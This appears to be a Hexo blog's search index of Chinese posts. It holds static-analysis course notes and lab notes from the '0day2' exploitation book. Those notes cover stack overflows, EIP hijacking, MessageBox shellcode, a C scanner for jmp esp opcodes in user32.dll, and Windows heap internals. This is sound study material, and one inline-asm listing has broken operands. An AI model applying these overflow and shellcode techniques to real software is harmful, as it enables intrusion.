            
            <tag> Static Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU Static Analysis - Intermediate Representation</title>
      <link href="/2024/03/24/StaticAnalysis/NJU-Static-Analysis-Intermediate-Representation/"/>
      <url>/2024/03/24/StaticAnalysis/NJU-Static-Analysis-Intermediate-Representation/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Intermediate-Representation"><a href="#NJU-Static-Analysis-Intermediate-Representation" class="headerlink" title="NJU Static Analysis - Intermediate Representation"></a>NJU Static Analysis - Intermediate Representation</h1><p>重点：</p><ul><li><p>编译过程中的IR</p></li><li><p>3AC –&gt; BB –&gt; CFG的构建过程</p></li></ul><h2 id="Complier"><a href="#Complier" class="headerlink" title="Complier"></a>Complier</h2><p>大致过程如下：</p><blockquote><p>词法分析（Scanner）&#x3D;&gt; 生成token</p><p>语法分析（Parser）&#x3D;&gt; 由token解析成AST（非上下文检查，比如只把token组成一个语句而已）</p><p>语义分析（Type Checker） &#x3D;&gt; 上下文基础上进行检查</p><p>然后通过Translator（这个依语言而定）来转成IR（中间表示）</p></blockquote><p><strong>静态分析的对象就是IR</strong></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241720545.png" alt="image-20240323213739799"></p><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><p>IR的表示方法：</p><table><thead><tr><th align="left">组织结构 特点</th><th align="left">类型</th><th>举例</th></tr></thead><tbody><tr><td align="left">Linear IR</td><td align="left">基于线性代码、堆栈机代码</td><td>三地址代码</td></tr><tr><td align="left">Graphical IR</td><td align="left">基于图 抽象语</td><td>抽象语法树、法树、有向无环图、控制流图</td></tr><tr><td align="left">Hybrid IR</td><td align="left">基于图与线性代码混合 LLVM IR</td><td></td></tr></tbody></table><h3 id="3AC"><a href="#3AC" class="headerlink" title="3AC"></a>3AC</h3><p>3地址码</p><ul><li>Some Common 3AC Forms</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241720410.png" alt="image-20240323215258383"></p><blockquote><p>不同静态分析框架中的3AC表示形式不同</p></blockquote><h3 id="SSA"><a href="#SSA" class="headerlink" title="SSA"></a>SSA</h3><p>SSA（Static Single Assignment）</p><blockquote><p>给每个符号都添加下标以区别不同时刻下的符号信息</p></blockquote><blockquote><ul><li>Give each definition a fresh name</li><li>Propagate fresh name to subsequent uses</li><li>Every variable has exactly one definition</li></ul></blockquote><p>需要在控制流图上添加一些新的语句</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706766.png" alt="image-20240324155713331"></p><h2 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h2><blockquote><p>3AC &#x3D;&gt; BB &#x3D;&gt; CFG</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706180.png" alt="image-20240324160508540"></p><h3 id="Basic-Blocks（BB）"><a href="#Basic-Blocks（BB）" class="headerlink" title="Basic Blocks（BB）"></a>Basic Blocks（BB）</h3><blockquote><p>Basic blocks (BB) are maximal sequences of consecutive three-address instructions</p><p>（连续的三地址码序列）</p></blockquote><blockquote><p>BB中的入口只能是BB中的第一句</p><p>结束语句只能是BB中的最后一句</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706047.png" alt="image-20240324161340952"></p><h4 id="build-Basic-Blocks"><a href="#build-Basic-Blocks" class="headerlink" title="build Basic Blocks"></a>build Basic Blocks</h4><p>每个Basic Blocks中的第一条指令是leader</p><p>我们确定每个Basic Block的本质方法是确定Basic Block中的leader和跳转语句即可</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706583.png" alt="image-20240324165538362"></p><h3 id="Control-Flow-Graph（CFG）"><a href="#Control-Flow-Graph（CFG）" class="headerlink" title="Control Flow Graph（CFG）"></a>Control Flow Graph（CFG）</h3><p>控制流图的构建过程，注重“静态”思维，对于一些永真的判断是不关注的</p><ul><li>CFG的节点是BB</li><li>一个Basic Block到另一个Basic Block之间有且仅有一个edge<ul><li>有条件跳转，相邻块之间需要加edge</li><li>无条件跳转，相邻块之间不需要加edge</li></ul></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706557.png" alt="image-20240324170233088"></p><ul><li>goto label-value &#x3D;&#x3D;&gt; goto BasicBlock Name</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706471.png" alt="image-20240324170558671"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Static Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU Static Analysis - Introduction</title>
      <link href="/2024/03/20/StaticAnalysis/NJU-Static-Analysis-Introduction/"/>
      <url>/2024/03/20/StaticAnalysis/NJU-Static-Analysis-Introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Introduction"><a href="#NJU-Static-Analysis-Introduction" class="headerlink" title="NJU Static Analysis - Introduction"></a>NJU Static Analysis - Introduction</h1><blockquote><p>程序分析这块还处于宝宝阶段，故做下课堂笔记</p><p>感谢李老师和谭老师的开源精神~~  :)</p><p>（笔记中的截图来自于两位老师的PPT）</p></blockquote><h2 id="Why？"><a href="#Why？" class="headerlink" title="Why？"></a>Why？</h2><ul><li><p>程序可靠性</p><p>空指针、内存泄露</p></li><li><p>程序安全性</p></li></ul><p>​检测注入攻击路径</p><ul><li><p>编译优化</p><p>死代码优化、代码移动优化</p></li><li><p>程序理解</p><p>程序调用关系、类型检测</p></li></ul><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><blockquote><p>给定程序P，在不运行P的情况下，使用静态分析程序对其分析，判断P是否满足特性Q</p></blockquote><h3 id="Rice-Theorem"><a href="#Rice-Theorem" class="headerlink" title="Rice Theorem"></a>Rice Theorem</h3><blockquote><p>&#x3D;&gt; No Perfect static analysis</p></blockquote><h3 id="Perfect-Static-Analysis"><a href="#Perfect-Static-Analysis" class="headerlink" title="Perfect Static Analysis"></a>Perfect Static Analysis</h3><blockquote><p>Sound and Complete &#x3D;&gt; Perfect Static Analysis</p></blockquote><h4 id="What-is-Sound-and-Complete"><a href="#What-is-Sound-and-Complete" class="headerlink" title="What is Sound and Complete"></a>What is Sound and Complete</h4><ul><li><code>Sound</code>：对于程序存在的可能行为不漏报但有错报</li><li><code>Truth</code>：既不错报也不漏报</li><li><code>Complete</code>：漏报</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202054529.png" alt="image-20240320191240299"></p><ul><li><code>false negatives</code></li><li><code>false positive</code></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143129.png" alt="image-20240320205907751"></p><h3 id="Userful-Static-Analysis"><a href="#Userful-Static-Analysis" class="headerlink" title="Userful Static Analysis"></a>Userful Static Analysis</h3><p>• Compromise soundness (false negatives)</p><p>• Compromise completeness (false positives) </p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143268.png" alt="image-20240320205957189"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143143.png" alt="image-20240320205948604"></p><blockquote><p>Nowdays, Static Analysis’ trends:</p><p>​<strong>Sound</strong> <strong>but</strong> <strong>not fully-precise</strong> static analysis</p></blockquote><h4 id="Necessity-of-Soundness"><a href="#Necessity-of-Soundness" class="headerlink" title="Necessity of Soundness"></a>Necessity of Soundness</h4><blockquote><p>Soundness mean more bugs could be found</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143945.png" alt="image-20240320210737920"></p><h4 id="Example-of-Soundness"><a href="#Example-of-Soundness" class="headerlink" title="Example of Soundness"></a>Example of Soundness</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(input)</span><br><span class="line">    x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    x = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><blockquote><p>Static Analysis Results:</p><ol><li><p>When input is true, x &#x3D; 1</p><p>When input is false, x &#x3D; 0</p><p>&#x3D;&gt; sound</p></li><li><p>x &#x3D; 1 or x &#x3D; 0</p><p>&#x3D;&gt; sound</p></li><li><p>x &#x3D; 0, 1, 2, 3, 4</p><p>&#x3D;&gt; sound</p></li><li><p>x &#x3D; -1, 0</p><p>&#x3D;&gt; unsound</p></li></ol></blockquote><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>对于变量进行符号抽象</p><p>一个形象的例子：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143686.png" alt="image-20240320211524156"></p><ul><li>定义符号之后，那么可以对运算进行相应的定义了</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143419.png" alt="image-20240320211649359"></p><p><code>sound</code>：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143179.png" alt="image-20240320211950981"></p><h3 id="Over-approximation"><a href="#Over-approximation" class="headerlink" title="Over-approximation"></a>Over-approximation</h3><blockquote><p>Control flow (from wiki) :</p><p>control flow is the <strong>order</strong> in which individual <a href="https://en.wikipedia.org/wiki/Statement_(computer_science)">statements</a>, <a href="https://en.wikipedia.org/wiki/Instruction_(computer_science)">instructions</a> or <a href="https://en.wikipedia.org/wiki/Function_call">function calls</a> of an <a href="https://en.wikipedia.org/wiki/Imperative_programming">imperative</a> <a href="https://en.wikipedia.org/wiki/Computer_program">program</a> are <a href="https://en.wikipedia.org/wiki/Execution_(computing)">executed</a> or evaluated</p></blockquote><blockquote><p>Control flow Statement（控制流语句）</p><ul><li>无条件分支或跳转</li><li>条件分支</li><li>循环判断分支</li><li>子例程、协程</li><li>无条件停止</li></ul></blockquote><blockquote><p>程序分析中难免会碰到路径爆炸问题</p><p>我们通常采用flow merge</p><p>来完成Over-approximation</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Static Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0day2-Practice</title>
      <link href="/2024/03/13/Binary/0day2-Practice/"/>
      <url>/2024/03/13/Binary/0day2-Practice/</url>
      
        <content type="html"><![CDATA[<p>对书籍《0day软件漏洞精要分析-第二版》中的样本进行了调试分析</p><p>很喜欢书中的一句话：</p><blockquote><p>所有漂亮的 exploits 背后都隐藏着无数个对着寄存器发呆的不眠之夜</p></blockquote><p>复现参考：<a href="https://blog.wohin.me/">https://blog.wohin.me/</a></p><h1 id="《0day2》实战笔记：part1-基础知识"><a href="#《0day2》实战笔记：part1-基础知识" class="headerlink" title="《0day2》实战笔记：part1 - 基础知识"></a>《0day2》实战笔记：part1 - 基础知识</h1><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><blockquote><p>记录调试代码时碰到的不懂或有趣、顿悟的地方</p></blockquote><p>Ollydbg，首先调试到需要进行标准输入的地方</p><p>在调用<code>scanf</code>地方，从标准输入流中读入的数据写在栈上的位置</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047178.png" alt="image-20240311170006867"></p><p>写入后然后调用<code>crack_me.00401000</code>，进入后查看到字符串，我们很直接的猜测可能就是密码</p><p>调试的时候发现，执行了一个循环的过程，然后进行字符的比较</p><p>一个思路就是直接输入<code>1234567</code>通关</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047024.png" alt="image-20240311170545410"></p><p>第二个思路就是打<code>patch</code>，修改汇编语句为<code>jne short 0040107F</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047835.png" alt="image-20240311170820051"></p><p>正确的patch应该是使用010editor类工具修改PE文件中的二进制数据，此处不再演示了。</p><h1 id="《0day2》实战笔记：part2-栈溢出原理与实践"><a href="#《0day2》实战笔记：part2-栈溢出原理与实践" class="headerlink" title="《0day2》实战笔记：part2 - 栈溢出原理与实践"></a>《0day2》实战笔记：part2 - 栈溢出原理与实践</h1><h2 id="Lab-1"><a href="#Lab-1" class="headerlink" title="Lab"></a>Lab</h2><p>IDA反汇编，存在栈溢出</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132047146.png" alt="image-20240313160741662"></p><p>攻击思路有：</p><ul><li>使用栈溢出覆盖栈上的数据，完成变量覆盖</li><li>使用栈溢出劫持EIP，改变程序的执行流</li><li>shellcode注入</li></ul><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>IDA静态分析的时候发现了</p><p>最终密码校验的v3标志位和strcpy中的v3在栈上的关系如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046462.png" alt="image-20240313165112432"></p><p>查看源码，v2完全可控</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046496.png" alt="image-20240313165149755"><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046580.png" alt="image-20240313165255488"></p><p>只需要偏移8个字节，就可以覆盖，输入类似<code>aaaaaaaa</code>即可符合验证</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046811.png" alt="image-20240313165506654"></p><h3 id="劫持eip"><a href="#劫持eip" class="headerlink" title="劫持eip"></a>劫持eip</h3><p>既然可以覆盖变量，何不覆盖掉返回地址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046409.png" alt="image-20240313185613942"></p><p>主要看大端小端序，可以动态调试的时候查看</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046930.png" alt="image-20240313185534207"></p><p>报错是因为覆盖掉上一个栈帧地址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046007.png" alt="image-20240313185520386"></p><h3 id="栈上的shellcode注入"><a href="#栈上的shellcode注入" class="headerlink" title="栈上的shellcode注入"></a>栈上的shellcode注入</h3><p>我们搓出shellcode如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx</span><br><span class="line">push ebx</span><br><span class="line">push 626F6A2D</span><br><span class="line">push 646F6F67</span><br><span class="line">mov eax, esp</span><br><span class="line">push ebx ; uType</span><br><span class="line">push eax ; lpCaption</span><br><span class="line">push eax ; lpText</span><br><span class="line">push ebx ; hWnd</span><br><span class="line">mov eax, 0x77D507EA; 需要查看MessageBox的地址 = addr(User32.dll) + addr(offset)</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046721.png" alt="image-20240313191430059"></p><p>然后使用pwntools的asm模块，将汇编转字节码，当然也可以使用AI工具帮忙转，然后就是查看栈溢出点</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046158.png" alt="image-20240313204123973"></p><p>偏移0x30+0x4，然后再填入4字节的跳转到shellcode地址</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046485.png" alt="image-20240313204142563"></p><p>动态调试查看写入点的基址，一个trick是可以写一些显眼的脏数据查看</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046922.png" alt="image-20240313204441148"></p><p>所以写入buffer的数据为如下，<code>0x90</code>对应着<code>nop</code>，注意小端</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046338.png"></p><p>弹窗成功</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403132046999.png" alt="image-20240313203833764"></p><h1 id="《0day2》实战笔记：part3-开发shellcode的艺术"><a href="#《0day2》实战笔记：part3-开发shellcode的艺术" class="headerlink" title="《0day2》实战笔记：part3 - 开发shellcode的艺术"></a>《0day2》实战笔记：part3 - 开发shellcode的艺术</h1><h2 id="jmp-esp技术"><a href="#jmp-esp技术" class="headerlink" title="jmp esp技术"></a>jmp esp技术</h2><p>主要是如果将<code>shellcode</code>注入到函数的栈空间中，可能由于动态链接库的装载导致<code>shellcode</code>的定位出现问题</p><p>做法就是（如图所示），将<code>shellcode</code>写入到<code>ret</code>指令之前的栈里（可以先填充一段<code>nop</code>指令提高利用的成功率），然后在<code>ret</code>位置覆盖为指令<code>jmp esp</code>的地址作为跳板（这个可以通过爆搜内存进行查找）</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316152639936.png" alt="image-20240316152639936"></p><h3 id="内存搜索"><a href="#内存搜索" class="headerlink" title="内存搜索"></a>内存搜索</h3><p>内存搜索的相关代码解析：</p><p>思路就是LoadLibrary将DLL映射到当前进程的内存空间后，进行爆搜，粗暴而有效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_NAME <span class="string">&quot;user32.dll&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    <span class="type">int</span> position, address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    <span class="comment">// HINSTANCE</span></span><br><span class="line">    <span class="comment">// 实例或模块的句柄, 当可执行文件或dll加载到内存中, 使用句柄识别</span></span><br><span class="line">    </span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    <span class="comment">// 使用winapi - LoadLibray加载dll到当前进程的内存空间中</span></span><br><span class="line">    handle = LoadLibrary(DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>(!handle)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; load dll erro !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ptr=(BYTE*)handle;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 爆搜内存</span></span><br><span class="line">    <span class="keyword">for</span>(position=<span class="number">0</span>;!done_flag;position++)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 检测相关内存字节</span></span><br><span class="line">            <span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 0xFFE4: jmp esp</span></span><br><span class="line">                <span class="comment">// 计算偏移</span></span><br><span class="line">                <span class="type">int</span> address = (<span class="type">int</span>)ptr+position;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;jmp esp opcode found at 0x%x\n&quot;</span>, address);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(...)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> address = (<span class="type">int</span>)ptr + position;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;END at 0x%x&quot;</span>, address);</span><br><span class="line">            done_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里笔者其实有个疑惑，既然将DLL加载到主进程的内存空间中，那么爆搜到的内存地址不应该是主进程中的内存地址吗？</p><p>经过调试，LoadLibrary返回了一个句柄（Windows上的句柄的概念类似于Linux中的文件描述符），通过句柄，我们可以访问动态链接库中的资源。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403161750387.png" alt="image-20240316171819858"></p><h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>之后就是exploit</p><p>在这之前，需要查看：</p><ul><li><code>kernel32.dll</code>中的<code>exit</code>：<code>0x7C81CB12</code></li></ul><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316182542021.png" alt="image-20240316182542021"></p><ul><li>MessageBox的函数地址：<code>0x77D507EA</code></li></ul><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    <span class="type">char</span> dllbuf[<span class="number">11</span>]=<span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dllbuf);<span class="comment">// 主进程获得dllbuf的句柄</span></span><br><span class="line">    </span><br><span class="line">    _asm&#123;</span><br><span class="line">        sub sp, <span class="number">0x440</span></span><br><span class="line">        xor ebx, ebx</span><br><span class="line">        push ebx</span><br><span class="line">        push <span class="number">0x626F6A2D</span></span><br><span class="line">        push <span class="number">0x646F6F67</span></span><br><span class="line">        mov eax, esp</span><br><span class="line">        push ebx</span><br><span class="line">        push eax</span><br><span class="line">        push eax</span><br><span class="line">        push ebx</span><br><span class="line">        mov eax</span><br><span class="line">        call eax</span><br><span class="line">        push ebx</span><br><span class="line">        call ebx</span><br><span class="line">        mov eax</span><br><span class="line">        call eax</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用OD调试时转储shellcode</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316193617076.png" alt="image-20240316193617076"></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>此部分演示使用上个lab的shellcode</p><p>黑色高亮部分是<code>jmp esp</code>，然后用nop填充，再存shellcode，最后nop填充</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316210000114.png" alt="image-20240316210000114"></p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316205900434.png" alt="image-20240316205900434"></p><h2 id="抬高esp保护shellcode的完整性"><a href="#抬高esp保护shellcode的完整性" class="headerlink" title="抬高esp保护shellcode的完整性"></a>抬高esp保护shellcode的完整性</h2><p>多搞点nop？</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240316211045486.png" alt="image-20240316211045486"></p><h1 id="《0day2》实战笔记：part5-堆溢出利用"><a href="#《0day2》实战笔记：part5-堆溢出利用" class="headerlink" title="《0day2》实战笔记：part5 - 堆溢出利用"></a>《0day2》实战笔记：part5 - 堆溢出利用</h1><p>微软操作系统堆管理机制发展大致分为三个阶段：</p><ul><li>Windows 2000 ~ Windows XP SP1 堆管理系统没有丝毫考虑安全</li><li>Windows XP2 ~ Windows 2003 ，加入安全因素，如修改块首格式并加入cookie，双向链表节点在删除时会做指针验证</li><li>Windows Vista ~ Windows 7 是堆管理算法的里程碑</li></ul><p>书中主要涉及Windows 2000 ~ Windows XP SP1平台的堆管理策略</p><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><p>程序员申请内存返回的指针指向的是块身</p><p>块首对程序员是透明的，堆表中只索引所有空闲堆块</p><p><img src="https://blog.wohin.me/posts/0day-chp05/02DF49A0-7682-40CF-9D3A-1115539C167D.png" alt="img"></p><p>两种堆表：</p><ul><li>空闲双向链表，Freelist（空表）</li></ul><p>块首包含两个指针，用于组织双向链表</p><p><code>free[1]</code>标识堆中所有8字节空闲堆块，然后从<code>1</code>到<code>127</code>呈现按8字节大小进行递增</p><p><code>free[0]</code>存储的是所有<code>1024B &lt; x &lt; 512KB</code>的空闲堆块，按大小升序</p><p><img src="https://blog.wohin.me/posts/0day-chp05/A6E0ACB6-7159-40A3-88F2-8FE49ADD30B5.png" alt="img"></p><ul><li>快速单向链表，Lookaside（快表）</li></ul><h2 id="堆操作"><a href="#堆操作" class="headerlink" title="堆操作"></a>堆操作</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/01/14/hello-world/"/>
      <url>/2024/01/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
